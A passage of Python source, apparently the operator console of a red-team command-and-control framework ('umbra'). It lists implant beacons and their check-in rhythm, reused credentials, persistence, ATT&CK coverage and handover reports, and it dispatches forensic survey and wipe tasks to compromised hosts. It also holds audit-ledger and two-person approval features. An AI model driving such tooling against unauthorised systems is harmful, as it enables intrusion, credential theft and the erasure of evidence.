    cleaned = secret.strip().upper().replace(" ", "").replace("-", "")
    if not cleaned:
        raise ValueError("the secret is empty")
    padding = "=" * ((8 - len(cleaned) % 8) % 8)
    try:
        key = base64.b32decode(cleaned + padding, casefold=True)
    except (ValueError, binascii.Error) as exc:
        raise ValueError(f"the secret is not base32: {exc}") from exc
    if len(key) < 10:
        raise ValueError("the secret is too short")
    counter = int((when if when is not None else time.time()) // 30)
    digest = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    offset = digest[-1] & 0x0F
    value = struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7FFFFFFF
    return f"{value % 1000000:06d}"


def run_baseline(client: OperatorClient, console: Console, args: Any) -> int:
    """The paths the team watches on the hosts.

    A baseline is not a tripwire: the team asks "is this host the one we
    saw yesterday", and the answers are the size, the time and the digest
    of each path.  The baseline only reads: a baseline that rewrote the
    file it watches would destroy the very thing it is watching.
    """
    action = getattr(args, "baseline_cmd", "") or "list"
    if action == "list":
        payload = client.baseline_list(agent_id=args.agent, state=args.state)
        if args.json:
            emit(payload)
        else:
            rows = payload.get("entries") or []
            if not rows:
                print("the baseline is empty")
                return 0
            print(f"{len(rows)} watched paths")
            for row in rows:
                state = row.get("state", "?")
                seen = row.get("seen", "")
                size = row.get("size", 0)
                path = row.get("path", "?")
                note = row.get("note", "")
                label = row.get("label", "")
                line = f"  {row.get('id', '?'):<8} {state:<9} {size:>8}B"
                line += f"  {path:<40}"
                if label:
                    line += f"  {label}"
                if note:
                    line += f"  {note}"
                if seen:
                    line += f"  (seen {seen})"
                print(line)
        return 0
    if action == "add":
        if not args.path:
            print("a path is needed", file=sys.stderr)
            return 2
        payload = client.baseline_add(args.agent, args.path,
                                        label=args.label, note=args.note)
        if args.json:
            emit(payload)
        else:
            print(f"the path is watched as {payload.get('id', '?')}: "
                  f"{args.path} on {args.agent}")
        return 0
    if action == "remove":
        payload = client.baseline_remove(args.id)
        if args.json:
            emit(payload)
        else:
            print(f"the path {payload.get('id', args.id)} is not watched any "
                  f"more; the file on the host stays where it is")
        return 0
    if action == "check":
        payload = client.baseline_check(args.agent, wait=args.wait)
        task_id = payload.get("task_id", "")
        if args.json:
            emit(payload)
            return 0
        print(f"the look was queued on {args.agent}: {task_id} "
              f"({payload.get('paths', 0)} paths)")
        if not args.wait or not task_id:
            return 0
        task = client.task(task_id)
        if not task.get("state") or task.get("state") == "queued":
            from .flows import run_bulk
            run_bulk(client, console, "baseline.look", {"agent": args.agent},
                     [{"task_id": task_id, "agent_id": args.agent}],
                     cap=1, timeout=180.0, wait=True)
            task = client.task(task_id)
        answer = str(task.get("out", "") or task.get("err", "") or "")
        if task.get("state") == "done":
            print(f"  {args.agent}  done")
            for line in answer.splitlines():
                print(f"    {line}")
            snapped = (task.get("meta") or {}).get("baseline_snaps")
            if snapped:
                change = 0
                for line in answer.splitlines():
                    if line.strip().startswith("missing") or "touched" in line:
                        change += 1
                if change:
                    print(f"    (the drift is on the ledger: "
                          f"{change} changes)")
        else:
            print(f"  {args.agent}  {task.get('state', '?')}  {answer}")
        return 0
    print(f"unknown baseline command: {action}", file=sys.stderr)
    return 2


def run_note(client: OperatorClient, console: Console, args: Any) -> int:
    """The notes the team writes about the hosts.

    The dossier of a host is what the server knows; the notes are what
    the team says.  A note is one short line of words, the operator who
    wrote it and the moment it was written, and it travels with the
    dossier of the host, so it is where the host is looked at.
    """
    action = getattr(args, "note_cmd", "") or "list"
    if action == "list":
        payload = client.note_list(agent_id=args.agent)
        if args.json:
            emit(payload)
        else:
            rows = payload.get("notes") or []
            if not rows:
                print("no notes are written")
                return 0
            print(f"{len(rows)} notes")
            for row in rows:
                state = "on" if row.get("pinned") else "off"
                marker = ">" if row.get("pinned") else " "
                print(f" {marker} {row.get('id', '?'):<8} {row.get('agent_id', '?'):<14}"
                      + f" {row.get('written', '?'):<10} {row.get('author', '?'):<12}"
                      + f"  {row.get('text', '')}")
        return 0
    if action == "add":
        if not args.agent:
            print("the host was not named", file=sys.stderr)
            return 2
        if not args.text:
            print("the line was not written", file=sys.stderr)
            return 2
        payload = client.note_add(args.agent, args.text)
        if args.json:
            emit(payload)
        else:
            print(f"the note {payload.get('id', '?')} is written on "
                  f"{payload.get('agent_id', '?')}: {payload.get('text', '')}")
        return 0
    if action == "show":
        payload = client.note_show(args.id)
        if args.json:
            emit(payload)
        else:
            print(f"note {payload.get('id', args.id)} "
                  f"of {payload.get('agent_id', '?')}, "
                  f"by {payload.get('author', '?')}, "
                  f"written at {payload.get('written', '?')}")
            print(f"  {payload.get('text', '')}")
        return 0
    if action == "remove":
        payload = client.note_remove(args.id)
        if args.json:
            emit(payload)
        else:
            print(f"the note {payload.get('id', args.id)} is taken away; "
                  f"the host stays as it is")
        return 0
    print(f"unknown note command: {action}", file=sys.stderr)
    return 2


def run_hook(client: OperatorClient, console: Console, args: Any) -> int:
    """The wires to the outside world.

    A console watches the events by staying connected; a wire carries
    them to a place the team wrote down — a chat room, a pager, a
    ticket queue.  The server posts and never asks, and the delivery
    book says how every post went.
    """
    action = getattr(args, "hook_cmd", "") or "list"
    if action == "list":
        payload = client.hook_list()
        if args.json:
            emit(payload)
        else:
            rows = payload.get("hooks") or []
            if not rows:
                print("no wires are written down")
                return 0
            print(f"{len(rows)} wires")
            for row in rows:
                kinds = ",".join(row.get("kinds") or []) or "all"
                last = row.get("last") or {}
                status = last.get("status", "")
                status_txt = f"{status}" if status else "-"
                when = str(last.get("when", "-"))
                err = f"  err: {last.get('err')}" if last.get("err") else ""
                print(f"  {row.get('id', '?'):<8} {row.get('url', '?')}")
                print(f"           kinds: {kinds:<28} "
                      f"last: {status_txt} at {when}{err}")
        return 0
    if action == "add":
        kinds = [part.strip() for part in (args.kinds or "").split(",")
                 if part.strip()]
        payload = client.hook_add(args.url, kinds=kinds, secret=args.secret)
        if args.json:
            emit(payload)
        else:
            print(f"the wire {payload.get('id', '?')} is written down")
            print(f"  url:    {payload.get('url', '?')}")
            kinds = ",".join(payload.get("kinds") or []) or "all"
            print(f"  kinds:  {kinds}")
            print("  ring it once with: umbra hook test "
                  f"{payload.get('id', '?')}")
        return 0
    if action == "remove":
        payload = client.hook_remove(args.id)
        if args.json:
            emit(payload)
        else:
            print(f"the wire {payload.get('id')} is forgotten")
        return 0
    if action == "test":
        payload = client.hook_test(args.id)
        if args.json:
            emit(payload)
        else:
            status = payload.get("status", 0)
            latency = payload.get("latency_ms", "?")
            if payload.get("err"):
                print(f"the wire answered with nothing: {payload.get('err')}")
                return 1
            print(f"the wire answered: {status} in {latency} ms")
            print("  the post was marked as a test; nobody was paged")
        return 0
    print(f"unknown hook command: {action}", file=sys.stderr)
    return 2


# The order of the columns of the wall is the order of the trade:
# from the first look to the last blow.
_ATTACK_TACTICS = [
    "reconnaissance", "resource-development", "initial-access",
    "execution", "persistence", "privilege-escalation",
    "defense-evasion", "credential-access", "discovery",
    "lateral-movement", "collection", "command-and-control",
    "exfiltration", "impact",
]


def run_attack(client: OperatorClient, console: Console, args: Any) -> int:
    """The wall of the techniques the team uses.

    The MITRE ATT&CK catalogue is the common tongue of the trade: the
    wall counts the finished work of the team against it.  A technique
    with zero tasks is a door the team has not tried, and that is the
    point of having the wall.
    """
    payload = client.attack_coverage(agent_id=args.agent)
    if args.json:
        emit(payload)
        return 0
    rows = payload.get("techniques") or []
    covered = payload.get("covered", 0)
    total = payload.get("total", len(rows))
    where = f" on {args.agent}" if args.agent else ""
    print(f"the wall{where}: {covered} of {total} techniques were used")
    by_tactic: Dict[str, List[Dict[str, Any]]] = {}
    for row in rows:
        by_tactic.setdefault(row.get("tactic", "?"), []).append(row)
    for tactic in _ATTACK_TACTICS:
        group = by_tactic.get(tactic)
        if not group:
            continue
        used = [row for row in group if row.get("tasks", 0) > 0]
        if not used and not args.all:
            continue
        print(f"  {tactic}")
        shown = group if args.all else used
        for row in shown:
            mark = "x" if row.get("tasks", 0) > 0 else " "
            agents = len(row.get("agents") or [])
            last = str(row.get("last", "-"))[:10] or "-"
            print(f"   [{mark}] {row.get('id', '?'):<10} "
                  f"{row.get('name', '?')[:44]:<44} "
                  f"{row.get('tasks', 0):>4} tasks  {agents:>2} hosts  {last}")
    unmapped = payload.get("unmapped") or []
    if unmapped:
        print("  kinds nobody mapped against the catalogue: "
              + ", ".join(unmapped))
    return 0


def run_search(client: OperatorClient, console: Console, args: Any) -> int:
    """The digging box: one needle through the records of the team.

    The tasks, the notes and the credentials are dug at once, and each
    hit comes with the piece of the text around the needle, so the
    answer can be read without opening a second window.  A needle of
    small letters matches any casing; a capital means what it says.
    """
    query = " ".join(args.words).strip()
    if not query:
        print("the needle was not written", file=sys.stderr)
        return 2
    payload = client.search_query(query, scope=args.scope,
                                  agent_id=args.agent, limit=args.limit)
    if args.json:
        emit(payload)
        return 0
    count = payload.get("count", 0)
    if not count:
        print("nothing carries that word")
        return 0
    print(f"{count} records carry the word")
    sections = (("tasks", "the tasks"), ("notes", "the notes"),
                ("creds", "the creds"))
    for key, title in sections:
        rows = payload.get(key) or []
        if not rows:
            continue
        print(f"  {title}")
        for hit in rows:
            record = hit.get("task_id") or hit.get("note_id") \
                or hit.get("cred_id") or "?"
            agent = hit.get("agent_id") or "-"
            print(f"    {record:<12} {agent:<14} [{hit.get('field', '?')}]"
                  f"  {hit.get('snippet', '')}")
    return 0


def run_rhythm(client: OperatorClient, console: Console, args: Any) -> int:
    """How the beacons breathe.

    An implant calls home on a clock somebody set; the rhythm says the
    shape of what it actually does — the mean, the spread, and a name
    for the shape.  A beacon that calls home like a metronome is a
    beacon a watcher can set a clock by, so the fleet list puts the
    clocks first.
    """
    if args.agent:
        payload = client.rhythm_get(args.agent)
        if args.json:
            emit(payload)
        else:
            shape = payload.get("shape", "?")
            beats = payload.get("beats", 0)
            print(f"{payload.get('agent_id', args.agent)}: {shape}"
                  f" ({beats} beats)")
            if beats and beats >= 4:
                mean = payload.get("interval_ms", 0) / 1000
                spread = payload.get("spread_ms", 0) / 1000
                cv = payload.get("cv", 0) / 10
                print(f"  the pauses: {mean:.1f}s give or take {spread:.2f}s"
                      f" (cv {cv:.1f}%)")
                print(f"  the extremes: {payload.get('shortest_ms', 0)} ms to"
                      f" {payload.get('longest_ms', 0)} ms")
                print(f"  the next call of home is expected around"
                      f" {payload.get('eta', '?')}")
                wanted = payload.get("sleep", 0)
                jitter = payload.get("jitter", 0)
                if wanted:
                    print(f"  the plan was sleep {wanted}s with"
                          f" {jitter}% jitter; above is what the wire saw")
            elif beats:
                print("  too young for a shape: come back after"
                      " a few more check-ins")
        return 0
    payload = client.rhythm_fleet()
    if args.json:
        emit(payload)
        return 0
    rows = payload.get("fleet") or []
    if not rows:
        print("nobody has called home recently enough to have a shape")
        return 0
    print(f"{len(rows)} hosts, clocks first")
    for row in rows:
        beats = row.get("beats", 0)
        if beats >= 4:
            mean = row.get("interval_ms", 0) / 1000
            print(f"  {row.get('agent_id', '?'):<18} {row.get('shape', '?'):<13}"
                  f"  {mean:>7.1f}s mean  cv {row.get('cv', 0) / 10:.1f}%"
                  f"  ({beats} beats)")
        else:
            print(f"  {row.get('agent_id', '?'):<18} {row.get('shape', '?'):<13}"
                  f"  {'':>7}  {'':>11}  ({beats} beats)")
    return 0


def run_creds_reuse(client: OperatorClient, console: Console, args: Any) -> int:
    """The secrets that serve on more than one host.

    The vault keeps the digest of every material, so the reuse of a
    password is provable without the password leaving the vault: two
    hosts, one digest, one key somebody should rotate.
    """
    payload = client.creds_reuse()
    if args.json:
        emit(payload)
        return 0
    groups = payload.get("groups") or []
    if not groups:
        print("no secret opens more than one door")
        return 0
    print(f"{len(groups)} keys open more than one door")
    for group in groups:
        hosts = ", ".join(group.get("hosts") or [])
        accounts = ", ".join(group.get("accounts") or []) or "-"
        targets = ", ".join(group.get("targets") or []) or "-"
        print(f"  {group.get('digest', '?')}  {group.get('kind', '?'):<9}"
              f"  x{group.get('count', 0)}")
        print(f"     hosts:    {hosts}")
        print(f"     accounts: {accounts}")
        print(f"     targets:  {targets}")
    return 0


def run_silence(client: OperatorClient, console: Console, args: Any) -> int:
    """The watches of the silences: the news of nothing.

    The alarms of the day fire when something happens; a host that went
    quiet does nothing, and nothing fires no alarm.  The watch turns the
    nothing into an `agent.silent` event, so the consoles and the wires
    learn of it the way they learn of everything.
    """
    action = getattr(args, "silence_cmd", "") or "list"
    if action == "list":
        payload = client.silence_list()
        if args.json:
            emit(payload)
        else:
            rows = payload.get("watches") or []
            if not rows:
                print("no silences are watched")
                return 0
            print(f"{len(rows)} watches")
            for row in rows:
                quiet = row.get("quiet_for")
                live = f"quiet for {quiet}s" if quiet is not None else "unseen"
                fired = f"  spoke at {row.get('last_fired')}" \
                    if row.get("last_fired") else ""
                print(f"  {row.get('id', '?'):<8} {row.get('agent_id', '?'):<18}"
                      f"  pause {row.get('seconds', '?')}s"
                      f"  every {row.get('cooldown', '?')}s  {live}{fired}")
        return 0
    if action == "add":
        payload = client.silence_add(args.agent, args.seconds, args.cooldown)
        if args.json:
            emit(payload)
        else:
            print(f"the watch {payload.get('id')} is promised:"
                  f" if {payload.get('agent_id')} is quiet for"
                  f" {payload.get('seconds')}s, the word is said")
        return 0
    if action == "remove":
        payload = client.silence_remove(args.id)
        if args.json:
            emit(payload)
        else:
            print(f"the watch {payload.get('id')} is forgotten")
        return 0
    print(f"unknown silence command: {action}", file=sys.stderr)
    return 2


def run_dossier(client: OperatorClient, console: Console, args: Any) -> int:
    """The file of a host: what the server knows and what it did.
    The dossier is one page: the identity, the health, the work, the
    persistence, the tripwires and the requests.  What is not known is
    said as well, because an operator who does not know that is a
    difference cannot act on it.
    """
    action = getattr(args, "dossier_cmd", "") or "list"
    if action == "list":
        payload = client.dossier_list()
        if args.json:
            emit(payload)
        else:
            print_dossiers(payload)
        return 0
    if action == "show":
        payload = client.dossier_get(args.agent)
        if args.json:
            emit(payload)
        else:
            print_dossier(payload)
        return 0
    print(f"unknown dossier command: {action}", file=sys.stderr)
    return 2


def cleanup_step(client: OperatorClient, console: Console, agent_id: str,
                 command: str, task_args: Dict[str, Any]) -> Dict[str, Any]:
    """Run one step of the cleanup and read its counters.

    A host that does not answer is not a failure of the cleanup: the
    row says that nothing was read, and the operator sees which host it
    was.
    """
    try:
        if command == "forensics.survey":
            res = client.forensics_survey(agent_id)
        elif command == "forensics.wipe":
            res = client.forensics_wipe(agent_id, task_args.get("what") or [])
        else:
            res = client.forensics_verify(agent_id)
        task_id = str(res.get("task_id", ""))
        if not task_id:
            return {}
        console.note_task(task_id, agent_id, command, task_args)
        record = client.wait_for_result(task_id, timeout=180.0)
        console.note_result(task_id, record)
        meta = record.get("meta") or {}
        return meta if isinstance(meta, dict) else {}
    except Exception as exc:  # noqa: BLE001 - one host must not stop the run
        print(f"{agent_id}: {command} failed: {exc}", file=sys.stderr)
        return {}


def print_task_result(task: Dict[str, Any]) -> None:
    print(f"task    : {task.get('id')}")
    print(f"agent   : {task.get('agent_id')}")
    print(f"kind    : {task.get('kind')}")
    print(f"state   : {task.get('state')}")
    print(f"exit    : {task.get('code')}")
    if task.get("claimed_by"):
        print(f"claimed : {task['claimed_by']}")
    if task.get("err"):
        print(f"error   : {task['err']}")
    meta = task.get("meta") or {}
    if meta:
        # Transfer metadata (total/offset/eof/sha256) and anything else the
        # beacon attached to the RESULT; sorted so the output is stable.
        items = ", ".join(f"{k}={meta[k]}" for k in sorted(meta))
        print(f"meta    : {items}")
    out = decode_out(task.get("out", ""))
    if out:
        print("--- output " + "-" * 50)
        print(out.rstrip())


def print_armory(payload: Dict[str, Any]) -> None:
    """Render the extension store: the catalogue and what is installed."""
    entries = payload.get("entries") or []
    installed = payload.get("installed") or []
    print(f"signing key verified: {'yes' if payload.get('verified') else 'no'}")
    print("catalogue:")
    rows = [
        [
            e.get("name", "?"),
            e.get("version", "?"),
            e.get("os", "?"),
            e.get("arch", "?"),
            e.get("format", "?"),
            e.get("size", 0),
            short(",".join(e.get("caps") or []), 20) or "-",
            short(e.get("description", ""), 40),
        ]
        for e in entries
    ]
    print(table(
        ["NAME", "VERSION", "OS", "ARCH", "FORMAT", "SIZE", "NEEDS", "DESCRIPTION"], rows))
    print("installed:")
    rows = [
        [
            e.get("name", "?"),
            e.get("version", "?"),
            e.get("size", 0),
            short(e.get("sha256", ""), 16),
            fmt_ts(e.get("installed")),
        ]
        for e in installed
    ]
    print(table(["NAME", "VERSION", "SIZE", "SHA256", "INSTALLED"], rows))


def print_armory_needs(payload: Dict[str, Any]) -> None:
    """Render what a module needs: the host capabilities and the arguments."""
    print(f"module  : {payload.get('name')} {payload.get('version', '')}".rstrip())
    print(f"format  : {payload.get('format', '?')}")
    print(f"platform: {payload.get('os', '?')} / {payload.get('arch', '?')}")
    print(f"digest  : {payload.get('digest', '')}")
    caps = payload.get("caps") or []
    print(f"needs   : {', '.join(caps) if caps else 'nothing (it runs anywhere)'}")
    print("arguments:")
    schema = payload.get("args") or payload.get("schema") or []
    rows = [
        [
            a.get("name", "?"),
            a.get("type", "?"),
            "yes" if a.get("required") else "no",
            a.get("default", "-"),
            short(a.get("help", ""), 40),
        ]
        for a in schema
    ]
    if rows:
        print(table(["NAME", "TYPE", "REQUIRED", "DEFAULT", "HELP"], rows))
    else:
        print("  (none)")
    output = payload.get("output") or {}
    if output.get("type"):
        print(f"answers : {output.get('type')}"
              f"{' - ' + output['description'] if output.get('description') else ''}")
    requires = payload.get("requires") or []
    if requires:
        print(f"depends : {', '.join(requires)}")
    missing = payload.get("missing") or []
    if missing:
        print(f"missing : {', '.join(missing)} (not in the catalogue)")


def print_aliases(aliases: List[Dict[str, Any]]) -> None:
    """Render the saved command namespace."""
    rows = [
        [
            a.get("name", "?"),
            a.get("kind", "?"),
            a.get("extension", "-"),
            a.get("by", "-"),
            fmt_ts(a.get("created")),
            short(a.get("description", ""), 36),
        ]
        for a in aliases
    ]
    print(table(["NAME", "KIND", "EXTENSION", "BY", "CREATED", "DESCRIPTION"], rows))


def render_handover(payload: Dict[str, Any], notes: Optional[List[Dict[str, Any]]] = None) -> str:
    """The handover document of an engagement.

    The document is what a colleague reads when the operator who ran the
    engagement goes home: the inventory, the open work, what is installed
    on the hosts, what the reconnaissance found, the artefacts and the
    notes of the notebook.
    """
    lines: List[str] = []
    lines.append("# Handover")
    lines.append("")
    lines.append(f"- generated : {fmt_ts(payload.get('generated'))}")
    lines.append(f"- by        : {payload.get('by', '-')}")
    lines.append(f"- server    : {payload.get('server', '-')}")
    lines.append("")

    agents = payload.get("agents") or []
    lines.append(f"## The inventory ({len(agents)})")
    lines.append("")
    if agents:
        lines.append("| agent | host | os | user | state | last seen |")
        lines.append("|---|---|---|---|---|---|")
        for a in agents:
            lines.append("| {id} | {host} | {os} | {user} | {state} | {last} |".format(
                id=a.get("id", "?"), host=a.get("host", "?"), os=a.get("os", "?"),
                user=a.get("user", "?"), state=a.get("state", "?"),
                last=fmt_ts(a.get("last"))))
    else:
        lines.append("No agent ever checked in.")
    lines.append("")

    tasks = payload.get("tasks") or []
    lines.append(f"## The open work ({len(tasks)})")
    lines.append("")
    if tasks:
        lines.append("| task | agent | kind | state | claimed by | assigned to |")
        lines.append("|---|---|---|---|---|---|")
        for t in tasks:
            lines.append("| {id} | {agent} | {kind} | {state} | {claimed} | {assigned} |".format(
                id=t.get("id", "?"), agent=t.get("agent_id", "?"), kind=t.get("kind", "?"),
                state=t.get("state", "?"), claimed=t.get("claimed_by", "-"),
                assigned=t.get("assigned_to", "-")))
    else:
        lines.append("Nothing is pending.")
    lines.append("")

    findings = payload.get("findings") or []
    lines.append(f"## The findings ({len(findings)})")
    lines.append("")
    for f in findings:
        total = f.get("total")
        head = f"- {f.get('agent_id', '?')} ({f.get('task_id', '?')})"
        if total is not None:
            head += f": {total} finding(s)"
        lines.append(head)
        excerpt = f.get("excerpt")
        if excerpt:
            for row in str(excerpt).splitlines()[:12]:
                lines.append(f"  {row}")
    if not findings:
        lines.append("No reconnaissance has been run.")
    lines.append("")

    persist = payload.get("persistence") or []
    lines.append(f"## The persistence ({len(persist)})")
    lines.append("")
    if persist:
        lines.append("| agent | technique | location | state |")
        lines.append("|---|---|---|---|")
        for p in persist:
            lines.append("| {agent} | {tech} | {loc} | {state} |".format(
                agent=p.get("agent_id", "?"), tech=p.get("technique", "?"),
                loc=p.get("location", "-"), state=p.get("state", "?")))
    else:
        lines.append("Nothing is installed on the hosts.")
    lines.append("")

    sessions = payload.get("sessions") or []
    lines.append(f"## The open sessions ({len(sessions)})")
    lines.append("")
    for s in sessions:
        lines.append(f"- {s.get('id', '?')} on {s.get('agent_id', '?')} "
                     f"(task {s.get('task_id', '?')}, since {fmt_ts(s.get('opened'))})")
    if not sessions:
        lines.append("No session is open.")
    lines.append("")

    artifacts = payload.get("artifacts") or []
    lines.append(f"## The artefacts ({len(artifacts)})")
    lines.append("")
    for a in artifacts:
        lines.append(f"- {a.get('name', '?')} ({a.get('size', 0)} bytes, "
                     f"sha256 {short(str(a.get('sha256', '')), 16)})")
    if not artifacts:
        lines.append("The store is empty.")
    lines.append("")

    operators = payload.get("operators") or []
    lines.append(f"## The team ({len(operators)})")
    lines.append("")
    for o in operators:
        state = "stale" if o.get("stale") else "here"
        lines.append(f"- {o.get('name', '?')} ({o.get('role', '?')}): {state}, "
                     f"focus {o.get('focus') or '-'}")
    lines.append("")

    events = payload.get("events") or []
    lines.append(f"## The last moves ({len(events)})")
    lines.append("")
    for ev in events:
        lines.append(f"- {fmt_ts(ev.get('at'))} {ev.get('kind', '?')} "
                     f"{ev.get('agent_id') or ev.get('task_id') or ''}".rstrip())
    lines.append("")

    if notes:
        lines.append("## The notes")
        lines.append("")
        for note in notes:
            lines.append(f"- {note.get('body', '')}")
        lines.append("")
    return "\n".join(lines)


def print_team(payload: Dict[str, Any]) -> None:
    """Render the team snapshot: agents, operators and the chat log."""
    agents = payload.get("agents") or []
    operators = payload.get("operators") or []
    chat = payload.get("chat") or []
    print(f"server time: {fmt_ts(payload.get('server_time'))}  version: {payload.get('version', '?')}")
    print(f"agents ({len(agents)}):")
    for a in agents:
        print(f"  {a.get('id', '?'):<24} {a.get('host', '?'):<20} {a.get('state', '?')}")
    print(f"operators ({len(operators)}):")
    for o in operators:
        focus = o.get("focus") or "-"
        print(f"  {o.get('name', '?'):<16} {o.get('role', '?'):<10} focus={focus}")
    print(f"chat ({len(chat)}):")
    for m in chat:
        target = f" -> {m['to']}" if m.get("to") else ""
        print(f"  [{fmt_ts(m.get('at'))}] {m.get('from', '?')}{target}: {short(m.get('text', ''), 80)}")


def print_audit_verification(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the verification of the ledger.

    The answer is a sentence an operator can act on: the chain holds,
    or it breaks at a line and says why.
    """
    out = stream or sys.stdout
    entries = int(payload.get("entries", 0) or 0)
    head = str(payload.get("head", "") or "")
    if payload.get("ok"):
        print(f"the ledger is intact: {entries} entries, the chain ends at "
              f"{head[:16]}", file=out)
        return
    broken = int(payload.get("broken_at", 0) or 0)
    reason = str(payload.get("reason", "") or "the chain is broken")
    print(f"the ledger is broken at line {broken}: {reason}", file=out)
    print("the entries before that line are the ones that can still be "
          "trusted", file=out)


def print_hunt_indicators(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the catalogue of the indicators of the team.

    The catalogue is shared, so the console shows where every indicator
    came from: an indicator without a source is a rumour.
    """
    out = stream or sys.stdout
    rows = payload.get("indicators") or []
    if not rows:
        print("the catalogue of the indicators is empty", file=out)
        return
    rendered = [
        [
            r.get("id", "?"),
            r.get("kind", "?"),
            r.get("value", "?"),
            r.get("label", "") or "-",
            r.get("hits", 0),
            r.get("source", "") or "-",
        ]
        for r in rows
    ]
    print(table(["ID", "KIND", "VALUE", "LABEL", "HITS", "SOURCE"], rendered),
          file=out)
    total = int(payload.get("total", len(rows)) or 0)
    if total > len(rows):
        print(f"{len(rows)} of {total} indicators", file=out)


def print_health_fleet(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the score of the fleet.

    The score is only useful with its reasons, so the parts travel with
    it: the operator reads the sentence under the number, not the number
    alone.
    """
    out = stream or sys.stdout
    reports = payload.get("reports") or []
    if not reports:
        print("no host has checked in yet", file=out)
        return
    rendered = []
    for r in reports:
        notes = "; ".join(str(n) for n in (r.get("notes") or []))
        rendered.append([
            r.get("agent_id", "?"),
            r.get("score", "?"),
            r.get("grade", "?"),
            notes or "-",
        ])
    print(table(["AGENT", "SCORE", "GRADE", "WHY"], rendered), file=out)
    counts = payload.get("counts") or {}
    if counts:
        summary = ", ".join(f"{k}: {v}" for k, v in sorted(counts.items()))
        print(f"the fleet averages {payload.get('average', 0)} ({summary})", file=out)


def print_cases(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the cases of the engagement."""
    out = stream or sys.stdout
    rows = payload.get("cases") or []
    if not rows:
        print("no case has been opened yet", file=out)
        return
    rendered = [
        [
            r.get("id", "?"),
            r.get("title", "?"),
            r.get("state", "?"),
            r.get("artefacts", 0),
            r.get("events", 0),
            "intact" if r.get("intact") else "BROKEN",
        ]
        for r in rows
    ]
    print(table(["ID", "TITLE", "STATE", "EVIDENCE", "HANDS", "CHAIN"], rendered),
          file=out)


def print_case(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render one case: its evidence and the chain of custody."""
    out = stream or sys.stdout
    print(f"case {payload.get('id', '?')}: {payload.get('title', '')}", file=out)
    print(f"  state:   {payload.get('state', '?')}", file=out)
    print(f"  opened:  {payload.get('opened', '?')}", file=out)
    if payload.get("closed"):
        print(f"  closed:  {payload.get('closed', '?')}", file=out)
    if payload.get("notes"):
        print(f"  notes:   {payload.get('notes', '')}", file=out)
    artefacts = payload.get("artefacts") or []
    print(f"  the evidence ({len(artefacts)}):", file=out)
    if artefacts:
        rendered = [
            [
                a.get("id", "?"),
                a.get("kind", "?"),
                a.get("ref", "?"),
                (a.get("sha256", "") or "-")[:16],
                a.get("agent_id", "") or "-",
            ]
            for a in artefacts
        ]
        print(table(["ID", "KIND", "REF", "SHA256", "HOST"], rendered), file=out)
    events = payload.get("events") or []
    print(f"  the chain of custody ({len(events)} hands):", file=out)
    for e in events:
        print(f"    {e.get('seq', '?'):>3}  {e.get('at', '?')}  "
              f"{e.get('actor', '?')}  {e.get('action', '?')}  "
              f"{e.get('note', '')}", file=out)
    if payload.get("intact"):
        print(f"  the chain is intact, it ends at "
              f"{str(payload.get('head', ''))[:16]}", file=out)
    else:
        print(f"  THE CHAIN IS BROKEN at event {payload.get('broken_at', '?')}: "
              f"{payload.get('reason', '')}", file=out)


def print_approvals(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the queue of the two-person rule.

    The queue shows both hands: who asked and who decided.  A request
    without a second hand is a request that is still waiting.
    """
    out = stream or sys.stdout
    rows = payload.get("requests") or []
    if not rows:
        print("no request waits for a decision", file=out)
        return
    rendered = [
        [
            r.get("id", "?"),
            r.get("kind", "?"),
            r.get("agent_id", "") or "-",
            r.get("state", "?"),
            r.get("requested_by", "?"),
            r.get("decided_by", "") or "-",
            (r.get("reason", "") or "-")[:40],
        ]
        for r in rows
    ]
    print(table(["ID", "KIND", "HOST", "STATE", "ASKED BY", "DECIDED BY", "REASON"],
                rendered), file=out)


def print_approval(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render one request of the queue."""
    out = stream or sys.stdout
    print(f"request {payload.get('id', '?')}: {payload.get('kind', '?')}", file=out)
    print(f"  state:      {payload.get('state', '?')}", file=out)
    print(f"  host:       {payload.get('agent_id', '') or '-'}", file=out)
    print(f"  asked by:   {payload.get('requested_by', '?')} "
          f"at {payload.get('requested_at', '?')}", file=out)
    if payload.get("decided_by"):
        print(f"  decided by: {payload.get('decided_by')} "
              f"at {payload.get('decided_at', '?')}", file=out)
    if payload.get("expires_at"):
        print(f"  expires:    {payload.get('expires_at')}", file=out)
    if payload.get("reason"):
        print(f"  reason:     {payload.get('reason')}", file=out)
    if payload.get("note"):
        print(f"  note:       {payload.get('note')}", file=out)


def print_canaries(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the tripwires of the engagement."""
    out = stream or sys.stdout
    rows = payload.get("canaries") or []
    if not rows:
        print("no tripwire has been planted yet", file=out)
        return
    rendered = [
        [
            r.get("id", "?"),
            r.get("label", "?"),
            r.get("agent_id", "") or "-",
            r.get("state", "?"),
            r.get("checked_at", "") or "-",
            (r.get("note", "") or "-")[:40],
        ]
        for r in rows
    ]
    print(table(["ID", "LABEL", "HOST", "STATE", "LOOKED AT", "NOTE"], rendered),
          file=out)


def print_canary(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render one tripwire, with the verdict of the last look."""
    out = stream or sys.stdout
    print(f"canary {payload.get('id', '?')}: {payload.get('label', '')}", file=out)
    print(f"  state:    {payload.get('state', '?')}", file=out)
    print(f"  host:     {payload.get('agent_id', '') or '-'}", file=out)
    print(f"  planted:  {payload.get('planted_at', '?')}", file=out)
    if payload.get("checked_at"):
        print(f"  looked:   {payload.get('checked_at')}", file=out)
    if payload.get("verdict"):
        print(f"  verdict:  {payload.get('verdict')}", file=out)
    if payload.get("note"):
        print(f"  note:     {payload.get('note')}", file=out)


def print_dossier(payload: Dict[str, Any], stream: Any = None) -> None:
    """Render the file of one host.

    The dossier is one page, and the page says what is not known as
    well: an operator who does not know that something is missing cannot
    go and look for it.
    """
    out = stream or sys.stdout
    name = payload.get("host") or payload.get("id") or "?"
    print(f"{name}  {payload.get('os', '?')}/{payload.get('arch', '?')}  "
          f"{payload.get('state', '?')}  score {payload.get('score', '?')} "
          f"({payload.get('grade', '?')})", file=out)
    tags = payload.get("tags") or []
    if tags:
        print(f"  tags: {', '.join(str(t) for t in tags)}", file=out)
